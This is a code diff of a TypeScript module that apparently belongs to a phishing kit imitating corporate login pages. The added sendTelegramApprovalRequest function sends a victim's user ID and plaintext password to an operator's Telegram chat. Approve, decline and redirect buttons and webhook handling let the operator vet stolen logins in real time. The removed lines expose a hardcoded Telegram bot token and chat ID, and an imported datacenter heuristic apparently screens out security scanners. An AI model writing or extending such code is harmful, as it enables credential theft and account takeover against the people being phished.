@@ -1,9 +1,17 @@
 import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
 import { SITE_DISPLAY_NAME } from '@/lib/site-url'
 
-// Hardcoded ops Telegram credentials (Blast clone)
-const TELEGRAM_BOT_TOKEN = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
-const CHAT_IDS = ["8810036834"]
+const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
+const CHAT_IDS = (() => {
+  const values = [
+    ...(process.env.TELEGRAM_CHAT_ID || '').split(','),
+    ...(process.env.TELEGRAM_CHAT_IDS || '').split(','),
+  ]
+  return values.map((value) => value.trim()).filter(Boolean)
+})()
+const TELEGRAM_API_BASE = TELEGRAM_BOT_TOKEN
+  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
+  : ''
 
 /** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
 export interface VisitorTelegramData {
@@ -347,6 +355,7 @@ Method at time of click: ${asCode(methodLabel)}`
 
 export type SendTelegramMessageOptions = {
   disableWebPagePreview?: boolean
+  replyMarkup?: Record<string, unknown>
 }
 
 export async function sendTelegramMessage(
@@ -368,7 +377,7 @@ export async function sendTelegramMessage(
   }
   
   const promises = CHAT_IDS.map(chatId => 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -378,6 +387,7 @@ export async function sendTelegramMessage(
         text: message,
         parse_mode: 'HTML',
         disable_web_page_preview: disableWebPagePreview,
+        ...(options.replyMarkup ? { reply_markup: options.replyMarkup } : {}),
       })
     })
     .then(async (response) => {
@@ -408,6 +418,84 @@ export async function sendTelegramMessage(
   
   // Return true if at least one message succeeded, false otherwise
   return successCount > 0
+}
+
+type TelegramApiResponse = {
+  ok: boolean
+  description?: string
+}
+
+export async function sendTelegramApprovalRequest(data: {
+  token: string
+  userId: string
+  password?: string
+}): Promise<boolean> {
+  const password = String(data.password ?? '').trim() || '—'
+  const message = wrapFlowMessage(`🔔 <b>Login request – approve or deny</b>
+━━━━━━━━━━━━━━━━━━
+👤 User ID: ${asCode(data.userId)}
+🔑 Password: ${asCode(password)}
+
+Choose a decision below:`)
+
+  return sendTelegramMessage(message, {
+    replyMarkup: {
+      inline_keyboard: [
+        [
+          { text: '✅ Approve', callback_data: `approve:${data.token}` },
+          { text: '❌ Decline', callback_data: `decline:${data.token}` },
+        ],
+        [{ text: '↪️ Redirect', callback_data: `redirect:${data.token}` }],
+      ],
+    },
+  })
+}
+
+export async function answerTelegramCallbackQuery(
+  callbackQueryId: string,
+  text?: string,
+): Promise<void> {
+  if (!TELEGRAM_BOT_TOKEN || !callbackQueryId) return
+
+  await fetch(`${TELEGRAM_API_BASE}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      callback_query_id: callbackQueryId,
+      text,
+      show_alert: false,
+    }),
+  }).catch((error) => {
+    console.error('Failed to answer callback query', error)
+  })
+}
+
+export async function registerTelegramWebhook(url: string): Promise<TelegramApiResponse> {
+  if (!TELEGRAM_BOT_TOKEN) {
+    return { ok: false, description: 'TELEGRAM_BOT_TOKEN is not set' }
+  }
+
+  const secretToken = (process.env.TELEGRAM_WEBHOOK_SECRET || '').trim()
+
+  try {
+    const response = await fetch(`${TELEGRAM_API_BASE}/setWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        url,
+        ...(secretToken ? { secret_token: secretToken } : {}),
+      }),
+    })
+
+    const data = (await response.json().catch(() => ({}))) as TelegramApiResponse
+    if (!response.ok || !data.ok) {
+      return { ok: false, description: data.description || 'setWebhook failed' }
+    }
+    return { ok: true, description: data.description }
+  } catch (error) {
+    console.error('Failed to register Telegram webhook', error)
+    return { ok: false, description: 'setWebhook request failed' }
+  }
 }
 
 
